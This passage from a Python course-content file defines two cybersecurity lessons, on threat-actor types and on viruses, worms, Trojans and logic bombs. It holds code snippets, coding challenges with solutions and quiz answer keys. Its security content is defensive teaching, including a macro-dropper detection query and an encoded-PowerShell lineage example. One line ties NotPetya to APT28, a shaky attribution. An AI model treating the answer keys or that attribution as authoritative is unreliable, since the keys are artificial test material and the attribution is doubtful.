                    "# Well-known Nation-State APT Groups tracked globally:\n"
                    "# APT28 / Fancy Bear (Russia - GRU): NotPetya, DNC breach\n"
                    "# APT38 / Lazarus Group (North Korea): WannaCry, Sony Pictures, Axie Infinity theft\n"
                    "# APT41 / Double Dragon (China): Healthcare & telecom espionage, supply chain backdoors\n"
                    "# APT33 / Elfin (Iran): Aerospace and energy sector wiper malware (Shamoon)"
                ),
                "explanation": "Threat intelligence feeds use standard APT designations to attribute cyber campaigns to specific state entities."
            },
            {
                "title": "Python: Classifying Threat Actor by Signature Indicators",
                "language": "python",
                "code": (
                    "def classify_threat_actor(indicators: dict) -> str:\n"
                    "    if indicators.get('uses_custom_zero_days') and indicators.get('dwell_time_months', 0) > 6:\n"
                    "        return 'APT (Advanced Persistent Threat) / Nation-State'\n"
                    "    if indicators.get('demands_crypto_ransom'):\n"
                    "        return 'Organized Cybercrime Syndicate'\n"
                    "    if indicators.get('public_political_defacement'):\n"
                    "        return 'Hacktivist'\n"
                    "    if indicators.get('uses_canned_scripts_only'):\n"
                    "        return 'Script Kiddie'\n"
                    "    return 'General Threat Actor'\n\n"
                    "print(classify_threat_actor({'uses_custom_zero_days': True, 'dwell_time_months': 14}))\n"
                    "print(classify_threat_actor({'demands_crypto_ransom': True}))"
                ),
                "explanation": "Threat intelligence triage logic mapping behavioral tactics to adversary categories."
            }
        ],
        coding_challenge={
            "description": "Write a Python function `triage_threat_level(actor_type: str) -> int` that maps 'SCRIPT_KIDDIE' -> 1, 'HACKTIVIST' -> 2, 'INSIDER' -> 3, 'CYBERCRIME' -> 4, and 'APT' -> 5. Return 0 for any unknown actor.",
            "starter_code": (
                "def triage_threat_level(actor_type: str) -> int:\n"
                "    # Return integer threat level 0 to 5\n"
                "    return 0\n\n"
                "print(triage_threat_level('APT'))\n"
                "print(triage_threat_level('SCRIPT_KIDDIE'))"
            ),
            "solution_code": (
                "def triage_threat_level(actor_type: str) -> int:\n"
                "    levels = {\n"
                "        'SCRIPT_KIDDIE': 1,\n"
                "        'HACKTIVIST': 2,\n"
                "        'INSIDER': 3,\n"
                "        'CYBERCRIME': 4,\n"
                "        'APT': 5\n"
                "    }\n"
                "    return levels.get(actor_type.upper(), 0)\n\n"
                "print(triage_threat_level('APT'))\n"
                "print(triage_threat_level('SCRIPT_KIDDIE'))"
            ),
            "expected_output": "5\n1"
        },
        quizzes=[
            {
                "question": "What distinguishes an Advanced Persistent Threat (APT) from a standard cybercriminal or script kiddie?",
                "options": [
                    "APTs are typically nation-state sponsored, possessing immense resources, custom zero-day exploits, and the ability to maintain undetected persistence for months or years",
                    "APTs only attack personal gaming consoles",
                    "APTs do not use computers",
                    "APTs always send paper letters in the mail before attacking"
                ],
                "correct_answer": "APTs are typically nation-state sponsored, possessing immense resources, custom zero-day exploits, and the ability to maintain undetected persistence for months or years",
                "explanation": "APTs are sophisticated state-sponsored intelligence units targeting defense, energy, and government sectors with long-term strategic espionage goals."
            },
            {
                "question": "What is a 'Script Kiddie'?",
                "options": [
                    "A low-skilled individual who executes pre-packaged, automated attack tools and scripts written by others without understanding how they work",
                    "A child who teaches computer programming classes",
                    "A software engineer who writes shell scripts for Linux",
                    "A technician who repairs broken monitors"
                ],
                "correct_answer": "A low-skilled individual who executes pre-packaged, automated attack tools and scripts written by others without understanding how they work",
                "explanation": "Script kiddies rely entirely on existing publicly available tools (like LOIC, DDoS botnets) for notoriety or disruption without deep technical skills."
            },
            {
                "question": "What is the primary motivation driving 'Hacktivist' groups such as Anonymous?",
                "options": [
                    "Promoting political, social, or ideological causes through website defacements, data leaks, and service disruption",
                    "Stealing credit cards for personal luxury shopping",
                    "Mining cryptocurrency on university servers",
                    "Selling computer hardware to schools"
                ],
                "correct_answer": "Promoting political, social, or ideological causes through website defacements, data leaks, and service disruption",
                "explanation": "Hacktivists use hacking as a form of civil disobedience and protest against governments, corporations, or human rights violations."
            },
            {
                "question": "Why are 'Insider Threats' (current or former employees) considered among the most dangerous security risks?",
                "options": [
                    "They already possess legitimate credentials, authorized physical access, and intimate knowledge of where valuable corporate data is stored",
                    "They cannot be prosecuted under the law",
                    "They have faster internet access at home",
                    "They are immune to computer viruses"
                ],
                "correct_answer": "They already possess legitimate credentials, authorized physical access, and intimate knowledge of where valuable corporate data is stored",
                "explanation": "Insiders bypass perimeter defenses because they already hold legitimate access rights and understand internal audit blind spots."
            },
            {
                "question": "What industry-standard knowledge base maps threat actor Tactics, Techniques, and Procedures (TTPs) across the entire cyber attack lifecycle?",
                "options": ["The MITRE ATT&CK Framework", "The Wikipedia Security Portal", "The IEEE Standard 802.11", "The Apache License 2.0"],
                "correct_answer": "The MITRE ATT&CK Framework",
                "explanation": "MITRE ATT&CK is the globally recognized matrix documenting real-world adversary behavioral techniques used by defenders to improve detection."
            }
        ]
    ),

    # ---------------------------------------------------------
    # Day 20: Virus, Worms, Trojans & Logic Bombs
    # ---------------------------------------------------------
    DayBlueprint(
        order=20,
        title="Day 20: Virus, Worms, Trojans & Logic Bombs",
        concept="Differentiating between foundational malware categories based on infection vectors and propagation mechanisms: Viruses (requires user execution and file host), Worms (self-propagating across networks), Trojans (disguised as benign software), and Logic Bombs (time/condition-triggered payloads).",
        analogy="Think of bio-weapons and covert attacks: A Virus is a parasite that cannot move on its own; someone has to carry the infected apple to a party and take a bite. A Worm is a swarm of airborne locusts that flies across the city independently, entering every open window. A Trojan is the legendary Trojan Horse—a beautiful gift brought inside the castle walls that disgorges enemy soldiers at midnight. A Logic Bomb is a time bomb hidden in the basement set to detonate on the boss's birthday.",
        theory_sections=[
            {
                "heading": "Anatomy of Core Malware Types",
                "content": (
                    "Malware ('Malicious Software') is umbrella terminology for hostile code:\n\n"
                    "1. **Virus**: Attaches its malicious code to a legitimate host program or document (.exe, .docx macro). It **CANNOT spread without human interaction** (e.g., a user double-clicking an email attachment or launching an infected file).\n"
                    "2. **Worm**: Self-replicating and self-propagating. It **requires NO human interaction**. Worms exploit network protocol vulnerabilities to scan subnets and autonomously infect thousands of machines within minutes (e.g., Morris Worm, Blaster, Conficker).\n"
                    "3. **Trojan Horse**: Disguises itself as legitimate, useful software (e.g., a free game, cracked Photoshop, fake PDF invoice). Once executed by the victim, it deploys a covert backdoor or keylogger.\n"
                    "4. **Logic Bomb**: Malicious instructions embedded silently inside software that remain dormant until triggered by a specific condition (e.g., a specific calendar date, or when an administrator's user ID is deleted from HR payroll)."
                )
            },
            {
                "heading": "Historical Case Study: Stuxnet",
                "content": (
                    "Stuxnet (discovered 2010) was the world's first true cyber physical weapon. Combining a worm (propagating via 4 zero-days and USB drives) with a PLC rootkit, it silently manipulated Iran's uranium enrichment centrifuges to spin out of control while reporting normal status readings to operators."
                )
            }
        ],
        code_snippets=[
            {
                "title": "Detecting Malicious Word Macros and Suspicious Process Lineage",
                "language": "bash",
                "code": (
                    "# Attack lineage: Microsoft Word spawning cmd.exe or powershell.exe:\n"
                    "# Legitimate: WINWORD.EXE -> (none)\n"
                    "# Malware:    WINWORD.EXE -> cmd.exe -> powershell.exe -Enc BAB4...\n\n"
                    "# Windows PowerShell command to detect suspicious office child processes:\n"
                    "Get-CimInstance Win32_Process | Where-Object {$_.ParentProcessId -in (Get-Process winword).Id}"
                ),
                "explanation": "Word documents launching command shells is the classic signature of macro-based Trojan dropper infections."
            },
            {
                "title": "Python: Demonstrating a Benign Logic Bomb Condition Trigger",
                "language": "python",
                "code": (
                    "import datetime\n\n"
                    "def logic_bomb_payload():\n"
                    "    return 'MALICIOUS_PAYLOAD_DETONATED: Core database files compromised!'\n\n"
                    "def execute_software(trigger_date: datetime.date):\n"
                    "    today = datetime.date.today()\n"
                    "    # Logic bomb waits for specific date before activating payload\n"
                    "    if today >= trigger_date:\n"
                    "        return logic_bomb_payload()\n"
                    "    return 'Normal software execution: Payroll processed smoothly.'\n\n"
                    "print(execute_software(datetime.date(2020, 1, 1)))\n"
                    "print(execute_software(datetime.date(2099, 1, 1)))"
                ),
                "explanation": "Demonstrates how logic bomb payloads remain dormant in codebases to evade short-term sandbox detonation tests."
            }
        ],
        coding_challenge={
            "description": "Write a Python function `classify_malware(requires_host_file: bool, self_propagates_over_network: bool, user_execution_required: bool) -> str` that returns 'WORM' if it self-propagates and requires no user execution, 'VIRUS' if it requires a host file and user execution, 'TROJAN' if no self-propagation and user execution without host attachment, and 'UNKNOWN' otherwise.",
            "starter_code": (
                "def classify_malware(requires_host_file: bool, self_propagates_over_network: bool, user_execution_required: bool) -> str:\n"
                "    # Return 'WORM', 'VIRUS', 'TROJAN', or 'UNKNOWN'\n"
                "    return ''\n\n"
                "print(classify_malware(False, True, False))\n"
                "print(classify_malware(True, False, True))"
            ),
            "solution_code": (
                "def classify_malware(requires_host_file: bool, self_propagates_over_network: bool, user_execution_required: bool) -> str:\n"
                "    if self_propagates_over_network and not user_execution_required:\n"
                "        return 'WORM'\n"
                "    if requires_host_file and user_execution_required and not self_propagates_over_network:\n"
                "        return 'VIRUS'\n"
                "    if not requires_host_file and not self_propagates_over_network and user_execution_required:\n"
                "        return 'TROJAN'\n"
                "    return 'UNKNOWN'\n\n"
                "print(classify_malware(False, True, False))\n"
                "print(classify_malware(True, False, True))"
            ),
            "expected_output": "WORM\nVIRUS"
        },
        quizzes=[
            {
                "question": "What is the primary difference between a Computer Virus and a Computer Worm?",
                "options": [
                    "A virus requires a host program and user execution to spread, whereas a worm self-replicates across networks autonomously without user intervention",
                    "A virus is hardware, while a worm is software",
                    "A worm only affects Apple Mac computers",
                    "A virus can be cured with medicine"
                ],
                "correct_answer": "A virus requires a host program and user execution to spread, whereas a worm self-replicates across networks autonomously without user intervention",
                "explanation": "Worms propagate automatically by scanning network ports and exploiting services, while viruses require a human to run the infected file."
            },
            {
                "question": "An email arrives with what looks like a harmless PDF invoice or free game, but running it secretly installs a remote backdoor. What type of malware is this?",
                "options": ["Trojan Horse", "Worm", "Logic Bomb", "Rootkit"],
                "correct_answer": "Trojan Horse",
                "explanation": "Trojans disguise their true malicious functionality behind a seemingly desirable, harmless facade to trick users into executing them."
            },
            {
                "question": "What is a 'Logic Bomb'?",
                "options": [
                    "Malicious code planted silently in a system that executes only when a specific trigger condition (such as a calendar date or employee termination) is met",
                    "A computer algorithm that solves math equations",
                    "An explosive detonator placed inside a power supply",
                    "A device that boosts Wi-Fi signal"
                ],
                "correct_answer": "Malicious code planted silently in a system that executes only when a specific trigger condition (such as a calendar date or employee termination) is met",
                "explanation": "Logic bombs lie dormant until specific parameters (e.g., Friday the 13th, or absence of an admin's account) trigger the payload."
            },
            {
                "question": "Which historic cyber weapon famously infected Iranian nuclear facilities by autonomously propagating via USB drives and manipulating industrial centrifuges?",
                "options": ["Stuxnet", "ILOVEYOU", "Conficker", "Melissa"],
                "correct_answer": "Stuxnet",
                "explanation": "Stuxnet was a military-grade cyber weapon designed to bridge air-gapped networks and sabotage Siemens programmable logic controllers (PLCs)."
            },
            {
                "question": "Why do security systems flag Word documents that attempt to spawn `cmd.exe` or `powershell.exe`?",
                "options": [
                    "Word processing documents should never legitimately launch administrative command shells; this behavior indicates a malicious macro dropper",
                    "Command prompt cannot read English text",
                    "Microsoft Word is incompatible with Windows",
                    "PowerShell uses too much monitor brightness"
                ],
                "correct_answer": "Word processing documents should never legitimately launch administrative command shells; this behavior indicates a malicious macro dropper",
                "explanation": "Office macros executing shell binaries is the hallmark signature of Trojan droppers delivering ransomware or Cobalt Strike beacons."
            }
        ]
    ),


]
